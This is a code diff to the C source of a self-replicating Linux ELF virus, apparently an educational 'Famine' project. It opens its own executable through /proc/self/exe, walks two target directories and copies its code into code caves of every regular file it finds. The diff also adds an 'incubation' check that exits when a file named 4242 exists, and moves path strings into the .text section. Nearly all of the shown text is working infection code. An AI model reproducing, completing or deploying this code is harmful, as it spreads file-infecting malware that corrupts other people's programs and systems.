@@ -11,6 +11,9 @@
 #define BUILDER_SIZE 0x151;
 #define BUILDER_RE_ENTRY_OFFSET 0xe5;
 __attribute__((section(".text"))) volatile static char signatur[] = "Famine | abied-ch & fbruggem";
+__attribute__((section(".text"))) volatile static char path_self[] = "/proc/self/exe";
+__attribute__((section(".text"))) volatile static char mappings_path[] = "/proc/self/maps";
+__attribute__((section(".text"))) volatile static char incubation[] = "4242";
 // Structs
 typedef struct {
     uint64_t d_ino;          /* 64-bit inode number */
@@ -80,17 +83,15 @@ __attribute__((always_inline)) inline void ft_memcpy(volatile void *src, volatil
 
 __attribute__((always_inline)) inline void
 print_number_hex(uint64_t num) {
-    char buf[20]; // enough for up to 20 digits of 64-bit number
+    char buf[20];
     int pos = 0;
 
-    // special case 0
     if (num == 0) {
         char c = '0';
         ft_write(1, &c, 1);
         return;
     }
 
-    // extract digits in reverse order
     while (num > 0) {
         uint64_t cur = num % 16;
         if (cur < 10)
@@ -100,7 +101,6 @@ print_number_hex(uint64_t num) {
         num /= 16;
     }
 
-    // output digits in correct order
     while (pos > 0) {
         char c = buf[--pos];
         ft_write(1, &c, 1);
@@ -109,29 +109,35 @@ print_number_hex(uint64_t num) {
 
 __attribute__((always_inline)) inline void
 print_number(uint64_t num) {
-    char buf[20]; // enough for up to 20 digits of 64-bit number
+    char buf[20];
     int pos = 0;
 
-    // special case 0
     if (num == 0) {
         char c = '0';
         ft_write(1, &c, 1);
         return;
     }
 
-    // extract digits in reverse order
     while (num > 0) {
         buf[pos++] = '0' + (num % 10);
         num /= 10;
     }
 
-    // output digits in correct order
     while (pos > 0) {
         char c = buf[--pos];
         ft_write(1, &c, 1);
     }
 }
-//
+
+__attribute__((always_inline)) static inline void
+ft_exit_incubation() {
+    int fd_is_incubator = ft_open(incubation, O_RDONLY, 0);
+    if (fd_is_incubator > 0) {
+        ft_close(fd_is_incubator);
+        ft_exit(0);
+    }
+}
+
 __attribute__((always_inline)) static inline uint64_t parse_hex(volatile char* hex) {
     uint64_t result;
 
@@ -156,25 +162,7 @@ __attribute__((always_inline)) static inline uint64_t parse_hex(volatile char* h
 }
 
 __attribute__((always_inline)) static inline uint64_t get_base_address() {
-    volatile char mappings_path[16];
     volatile char buffer[400] = {0};
-
-    mappings_path[0] = '/';
-    mappings_path[1] = 'p';
-    mappings_path[2] = 'r';
-    mappings_path[3] = 'o';
-    mappings_path[4] = 'c';
-    mappings_path[5] = '/';
-    mappings_path[6] = 's';
-    mappings_path[7] = 'e';
-    mappings_path[8] = 'l';
-    mappings_path[9] = 'f';
-    mappings_path[10] = '/';
-    mappings_path[11] = 'm';
-    mappings_path[12] = 'a';
-    mappings_path[13] = 'p';
-    mappings_path[14] = 's';
-    mappings_path[15] = '\0';
 
     int fd = ft_open(mappings_path, O_RDONLY, 0);
 
@@ -217,23 +205,6 @@ jump_back(int fd_self) {
 
 void
 _start() {
-    volatile static char path_self[16];
-
-    path_self[0] = '/';
-    path_self[1] = 'p';
-    path_self[2] = 'r';
-    path_self[3] = 'o';
-    path_self[4] = 'c';
-    path_self[5] = '/';
-    path_self[6] = 's';
-    path_self[7] = 'e';
-    path_self[8] = 'l';
-    path_self[9] = 'f';
-    path_self[10] = '/';
-    path_self[11] = 'e';
-    path_self[12] = 'x';
-    path_self[13] = 'e';
-    path_self[14] = '\0';
     int fd_self = ft_open(path_self, O_RDONLY, 0);
     if (fd_self < 0) {
         ft_exit(0);
@@ -253,50 +224,51 @@ _start() {
 
     if (infect_dir(dir, fd_self)) jump_back(fd_self);
 
-    dir[9] = '2';
-    dir[10] = '\0';
-
-    if (infect_dir(dir, fd_self)) jump_back(fd_self);
-
     jump_back(fd_self);
 }
 
 __attribute__((always_inline)) inline int
 infect_dir(volatile char *dir_path, volatile int fd_self) {
-    int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
-    if (fd_dir < 0) return 0;
+    for (volatile int dir_index = 0; dir_index < 2; dir_index++) {
 
-    const uint64_t FILE_NAME_MAX = 255;
-    const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
-    const uint64_t ALINMENT = 8;
-    const uint64_t DIR_P_SIZE = DIR_P_SIZE_WITHOUT_ALIGNMENT + DIR_P_SIZE_WITHOUT_ALIGNMENT % ALINMENT;
+        int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
+        if (fd_dir < 0) return fd_dir;
 
-    volatile file file_self;
-    char dirp[DIR_P_SIZE];
-    int bytes_read = 0;
-    do {
-        bytes_read = ft_getdents64(fd_dir, dirp, DIR_P_SIZE);
-        if (bytes_read < 0) {
-            ft_close(fd_dir);
-            return 1;
-        }
+        const uint64_t FILE_NAME_MAX = 255;
+        const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
+        const uint64_t ALINMENT = 8;
+        const uint64_t DIR_P_SIZE = DIR_P_SIZE_WITHOUT_ALIGNMENT + DIR_P_SIZE_WITHOUT_ALIGNMENT % ALINMENT;
 
-        dirent64 *dirent_cur = (dirent64 *)dirp;
-        while ((((long)dirent_cur) - (long)dirp) < bytes_read) {
-            if (dirent_cur->d_type == DT_REG) {
-                volatile char full_path[ft_strlen(dirent_cur->d_name) + ft_strlen(dir_path) + 1 + 1];
-                ft_strncpy(dir_path, full_path, ft_strlen(dir_path));
-                full_path[ft_strlen(dir_path)] = '/';
-                ft_strncpy(dirent_cur->d_name, full_path + ft_strlen(dir_path) + 1, ft_strlen(dirent_cur->d_name) + 1);
-
-                file_mmap(fd_self, &file_self);
-                infect_file(full_path, &file_self);
-                file_munmap(&file_self);
+        volatile file file_self;
+        char dirp[DIR_P_SIZE];
+        int bytes_read = 0;
+        do {
+            bytes_read = ft_getdents64(fd_dir, dirp, DIR_P_SIZE);
+            if (bytes_read < 0) {
+                ft_close(fd_dir);
+                return 1;
             }
-            dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
-        }
-    } while (bytes_read > 0);
-    ft_close(fd_dir);
+
+            dirent64 *dirent_cur = (dirent64 *)dirp;
+            while ((((long)dirent_cur) - (long)dirp) < bytes_read) {
+                if (dirent_cur->d_type == DT_REG) {
+                    volatile char full_path[ft_strlen(dirent_cur->d_name) + ft_strlen(dir_path) + 1 + 1];
+                    ft_strncpy(dir_path, full_path, ft_strlen(dir_path));
+                    full_path[ft_strlen(dir_path)] = '/';
+                    ft_strncpy(dirent_cur->d_name, full_path + ft_strlen(dir_path) + 1, ft_strlen(dirent_cur->d_name) + 1);
+
+                    file_mmap(fd_self, &file_self);
+                    infect_file(full_path, &file_self);
+                    file_munmap(&file_self);
+                }
+                dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
+            }
+        } while (bytes_read > 0);
+
+        ft_close(fd_dir);
+        dir_path[9] = '2';
+        dir_path[10] = '\0';
+    }
     return (0);
 }
 
@@ -345,6 +317,7 @@ infect_file(volatile char *path, volatile file *file_self) {
     char ch = '^';
     ft_write(1, &ch, 1);
     ch = '\n';
+
     if (provided_space < needed_space) {
         file_munmap(&file_target);
         ft_close(fd_target);
@@ -415,6 +388,7 @@ file_write(int fd, volatile file *file) {
     ft_write(fd, file->mem, file->size);
     return 0;
 }
+
 __attribute__((always_inline)) inline int
 file_mmap(int fd, volatile file *file) {
     uint64_t off = ft_lseek(fd, 0, SEEK_END);
@@ -434,7 +408,6 @@ file_munmap(volatile file *file) {
     return ft_munmap(file->mem, file->size);
 }
 
-// Helpers
 __attribute__((always_inline)) inline uint64_t
 copy_entries_into_code_caves(volatile entry *entries_target, volatile entry *entries_self, volatile uint64_t entries_self_num, volatile file *file_self,
                              volatile file *file_target, volatile code_cave *code_caves_target, volatile uint64_t code_caves_target_num) {
@@ -592,23 +565,6 @@ code_caves_get(volatile code_cave *code_caves, volatile file *file) {
         } else {
             char nl = '\n';
             return i;
-            if (section_old_end >= file->size - section_old_end) return i;
-                if (section_old_end <= header->e_shoff)
-                {
-                    volatile uint64_t foo = 152;
-                    print_number(952);
-
-                    ft_write(1, &nl, 1);
-                    if (section_old_end + header->e_shnum * header->e_shentsize >= file->size) return i;
-                    ft_write(1, &nl, 1);
-
-                    code_caves[i].start = header->e_shnum + header->e_shnum * header->e_shentsize;;
-                    code_caves[i].size = file->size - code_caves[i].start;
-                    code_caves[i].is_executable = last_one_was_executable;
-
-                    i++;
-                }
-            return i;
         }
 
         if (section_old_end != section_header->sh_offset && section_header->sh_offset - section_old_end > 16) {
@@ -690,6 +646,7 @@ entries_size_sum(volatile entry entries[], volatile uint64_t entries_num) {
 }
 
 // SYS CALLS
+// __attribute__((always_inline))
 inline long
 sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
     long ret;
